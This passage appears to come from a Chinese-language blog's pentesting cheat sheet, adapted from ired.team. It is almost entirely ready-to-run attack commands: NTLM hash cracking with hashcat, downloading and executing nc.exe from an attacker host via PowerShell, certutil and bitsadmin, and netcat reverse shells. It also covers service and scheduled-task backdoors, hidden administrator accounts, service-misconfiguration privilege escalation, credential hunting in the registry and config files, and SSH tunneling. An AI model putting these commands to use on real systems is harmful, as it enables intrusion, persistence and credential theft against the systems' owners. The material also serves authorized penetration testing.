-Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800# resulting hashspotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000# crack with hashcathashcat -m5600 &#39;spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000&#39; -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable</code></pre><h3 id="破解zip文件密码"><a href="#破解zip文件密码" class="headerlink" title="破解zip文件密码"></a>破解zip文件密码</h3><pre><code class="shell">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip</code></pre><h2 id="本地信息挖掘"><a href="#本地信息挖掘" class="headerlink" title="本地信息挖掘"></a>本地信息挖掘</h2><h3 id="寻找可读-写文件夹"><a href="#寻找可读-写文件夹" class="headerlink" title="寻找可读&#x2F;写文件夹"></a>寻找可读&#x2F;写文件夹</h3><pre><code class="powershell">$a = Get-ChildItem &quot;c:\windows\&quot; -recurse -ErrorAction SilentlyContinue$a | % &#123;    $fileName = $_.fullname    $acls = get-acl $fileName  -ErrorAction SilentlyContinue | select -exp access | ? &#123;$_.filesystemrights -match &quot;full|modify|write&quot; -and $_.identityreference -match &quot;authenticated users|everyone|$env:username&quot;&#125;    if($acls -ne $null)    &#123;        [pscustomobject]@&#123;            filename = $fileName            user = $acls | select -exp identityreference        &#125;    &#125;&#125;</code></pre><h3 id="检查是否已启用Powershell日志记录"><a href="#检查是否已启用Powershell日志记录" class="headerlink" title="检查是否已启用Powershell日志记录"></a>检查是否已启用Powershell日志记录</h3><pre><code class="shell">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLoggingreg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription</code></pre><h3 id="检查WinEvent日志中是否有SecureString"><a href="#检查WinEvent日志中是否有SecureString" class="headerlink" title="检查WinEvent日志中是否有SecureString"></a>检查WinEvent日志中是否有SecureString</h3><pre><code class="powershell">Get-WinEvent -FilterHashtable @&#123;LogName=&#39;Microsoft-Windows-PowerShell/Operational&#39;; ID=4104&#125; | Select-Object -Property Message | Select-String -Pattern &#39;SecureString&#39;</code></pre><h3 id="检查WinEvent的机器唤醒-睡眠时间"><a href="#检查WinEvent的机器唤醒-睡眠时间" class="headerlink" title="检查WinEvent的机器唤醒&#x2F;睡眠时间"></a>检查WinEvent的机器唤醒&#x2F;睡眠时间</h3><pre><code class="pwoershell">Get-WinEvent -FilterHashTable @&#123; ProviderName = &#39;Microsoft-Windows-Power-TroubleShooter&#39;  ; Id = 1 &#125;|Select-Object -Property @&#123;n=&#39;Sleep&#39;;e=&#123;$_.Properties[0].Value&#125;&#125;,@&#123;n=&#39;Wake&#39;;e=&#123;$_.Properties[1].Value&#125;&#125;</code></pre><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><h3 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h3><pre><code class="shell">#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftpservice atftpd start# Windowstftp -i $ATTACKER get /download/location/file /save/location/file</code></pre><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><pre><code class="shell"># Linux: set up ftp server with anonymous logon access;twistd -n ftp -p 21 -r /file/to/serve# Windows shell: read FTP commands from ftp-commands.txt non-interactively;echo open $ATTACKER&gt;ftp-commands.txtecho anonymous&gt;&gt;ftp-commands.txtecho whatever&gt;&gt;ftp-commands.txtecho binary&gt;&gt;ftp-commands.txtecho get file.exe&gt;&gt;ftp-commands.txtecho bye&gt;&gt;ftp-commands.txt ftp -s:ftp-commands.txt# Or just a one-liner(echo open 10.11.0.245&amp;echo anonymous&amp;echo whatever&amp;echo binary&amp;echo get nc.exe&amp;echo bye) &gt; ftp.txt &amp; ftp -s:ftp.txt &amp; nc.exe 10.11.0.245 443 -e cmd</code></pre><h3 id="CertUtil"><a href="#CertUtil" class="headerlink" title="CertUtil"></a>CertUtil</h3><pre><code class="shell">certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe</code></pre><h3 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h3><pre><code class="shell">python -c &quot;from urllib import urlretrieve; urlretrieve(&#39;http://10.11.0.245/nc.exe&#39;, &#39;C:\\Temp\\nc.exe&#39;)&quot;</code></pre><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><pre><code class="shell">powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe&quot; &#125;powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;); Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot; &#125;powershell -Command &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;)&quot;; Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/file.exe&#39;,&#39;file.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;file.exe&#39;);# download using default proxy credentials and launchpowershell -command &#123; $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString(&quot;http://$attacker/nc.exe&quot;) | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot; &#125;</code></pre><h3 id="VBScript"><a href="#VBScript" class="headerlink" title="VBScript"></a>VBScript</h3><pre><code class="shell">cscript wget.vbs http://$ATTACKER/file.exe localfile.exe</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre><code class="shell">wget http://$ATTACKER/filecurl http://$ATTACKER/file -Oscp ~/file/file.bin user@$TARGET:tmp/backdoor.py</code></pre><h3 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h3><pre><code class="shell"># Attackernc -l -p 4444 &lt; /tool/file.exe# Victimnc $ATTACKER 4444 &gt; file.exe</code></pre><h3 id="Windows-“debug-exe”-Method"><a href="#Windows-“debug-exe”-Method" class="headerlink" title="Windows “debug.exe” Method"></a>Windows “debug.exe” Method</h3><pre><code class="shell"># 1. In Linux, convert binary to hex ascii:wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt# 2. Paste nc.txt into Windows Shell.</code></pre><h3 id="Windows-BitsAdmin"><a href="#Windows-BitsAdmin" class="headerlink" title="Windows BitsAdmin"></a>Windows BitsAdmin</h3><pre><code class="shell">cmd.exe /c &quot;bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&amp;start %tmp%\payload.exe</code></pre><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="利用服务进行持久化"><a href="#利用服务进行持久化" class="headerlink" title="利用服务进行持久化"></a>利用服务进行持久化</h3><pre><code class="shell"># cmdsc create spotlessSrv binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;# powersehllNew-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName &quot;&#39;C:\Program Files\NotEvil\back.exe&#39;&quot; -Description &quot;Not at all&quot;</code></pre><h3 id="创建持久化后门"><a href="#创建持久化后门" class="headerlink" title="创建持久化后门"></a>创建持久化后门</h3><pre><code class="shell"># Launch evil.exe every 10 minutesschtasks /create /sc minute /mo 10 /tn &quot;TaskName&quot; /tr C:\Windows\system32\evil.exe</code></pre><h3 id="创建用户并添加到本地管理员组"><a href="#创建用户并添加到本地管理员组" class="headerlink" title="创建用户并添加到本地管理员组"></a>创建用户并添加到本地管理员组</h3><pre><code class="shell">net user spotless spotless /add &amp; net localgroup Administrators spotless /add</code></pre><h3 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h3><pre><code class="shell">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList&quot; /t REG_DWORD /v spotless /d 0 /f</code></pre><h3 id="利用服务配置错误进行提权"><a href="#利用服务配置错误进行提权" class="headerlink" title="利用服务配置错误进行提权"></a>利用服务配置错误进行提权</h3><pre><code class="shell"># Look for SERVICE_ALL_ACCESS in the outputaccesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *sc config [service_name] binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;sc qc [service_name] (to verify!)sc start [service_name]</code></pre><h3 id="递归查找隐藏文件"><a href="#递归查找隐藏文件" class="headerlink" title="递归查找隐藏文件"></a>递归查找隐藏文件</h3><pre><code class="shell">dir /A:H /s &quot;c:\program files&quot;</code></pre><h3 id="检查文件-目录权限"><a href="#检查文件-目录权限" class="headerlink" title="检查文件&#x2F;目录权限"></a>检查文件&#x2F;目录权限</h3><pre><code class="shell">icacls.exe C:\folder /findsid userName-or-*sid /t//look for (F)ull, (M)odify, (W)rite</code></pre><h3 id="检查Windows存储的凭据"><a href="#检查Windows存储的凭据" class="headerlink" title="检查Windows存储的凭据"></a>检查Windows存储的凭据</h3><pre><code class="shell">c:\unattend.xmlc:\sysprep.infc:\sysprep\sysprep.xmldir c:\*vnc.ini /s /bdir c:\*ultravnc.ini /s /b dir c:\ /s /b | findstr /si *vnc.inifindstr /si password *.txt | *.xml | *.inifindstr /si pass *.txt | *.xml | *.inidir /s *cred* == *pass* == *.conf# Windows Autologonreg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;# VNCreg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;# Puttyreg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;# Registryreg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s</code></pre><h3 id="检查未注册（引用）的服务"><a href="#检查未注册（引用）的服务" class="headerlink" title="检查未注册（引用）的服务"></a>检查未注册（引用）的服务</h3><pre><code class="shell">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</code></pre><h3 id="开启进程"><a href="#开启进程" class="headerlink" title="开启进程"></a>开启进程</h3><h4 id="Powershell-1"><a href="#Powershell-1" class="headerlink" title="Powershell"></a>Powershell</h4><pre><code class="shell"># Requires PSRemoting$username = &#39;Administrator&#39;;$password = &#39;1234test&#39;;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command &#123; whoami &#125;# without PSRemotingcmd&gt; powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential &#39;username&#39;, (ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force))# without PS Remoting, with argumentscmd&gt; powershell -command &quot;start-process cmd.exe -argumentlist &#39;/c calc&#39; -Credential (New-Object System.Management.Automation.PSCredential &#39;username&#39;,(ConvertTo-SecureString &#39;password&#39; -AsPlainText -Force))&quot;</code></pre><h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><pre><code class="shell"># Requires interactive consolerunas /user:userName cmd.exe</code></pre><h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><pre><code class="shell">psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe</code></pre><h4 id="Pth-WinExe"><a href="#Pth-WinExe" class="headerlink" title="Pth-WinExe"></a>Pth-WinExe</h4><pre><code class="shell">pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe</code></pre><h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><h3 id="SSH本地端口转发"><a href="#SSH本地端口转发" class="headerlink" title="SSH本地端口转发"></a>SSH本地端口转发</h3><pre><code class="shell"># Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER# Scenario: access a host that&#39;s being blocked by a firewall via SSH_SERVER;ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER</code></pre><h3 id="SSH动态端口转发"><a href="#SSH动态端口转发" class="headerlink" title="SSH动态端口转发"></a>SSH动态端口转发</h3><pre><code class="shell"># Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER# Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;ssh -D 127.0.0.1:8080 user@SSH_SERVER</code></pre><h3 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a>SSH远程端口转发</h3><pre><code class="shell"># Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389# Scenario: expose RDP on non-routable network;ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVERplink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP</code></pre><h3 id="Proxy-Tunnel"><a href="#Proxy-Tunnel" class="headerlink" title="Proxy Tunnel"></a>Proxy Tunnel</h3><pre><code class="shell"># Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128# Scenario: a remote host has SSH running, but it&#39;s only bound to 127.0.0.1, but you want to reach it;proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555ssh user@127.0.0.1 -p 5555</code></pre><h3 id="HTTP隧道-SSH-Over-HTTP"><a href="#HTTP隧道-SSH-Over-HTTP" class="headerlink" title="HTTP隧道: SSH Over HTTP"></a>HTTP隧道: SSH Over HTTP</h3><pre><code class="shell"># Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22hts -F localhost:22 80# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80htc -F 8080 192.168.1.15:80# Client - connect to localhost:8080 -&gt; get tunneled to 192.168.1.15:80 -&gt; get redirected to 192.168.1.15:22ssh localhost -p 8080</code></pre><h3 id="netsh端口转发"><a href="#netsh端口转发" class="headerlink" title="netsh端口转发"></a>netsh端口转发</h3><pre><code class="shell">#添加一个IPV4到IPV4的端口映射netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 connectaddress=192.168.75.130  connectport=8080#指定监听ip和端口可以删除netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4445#查看存在的转发netsh interface portproxy show all</code></pre><blockquote><p>参考链接：<a href="https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets">Pentesting Cheatsheets</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CheckList </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
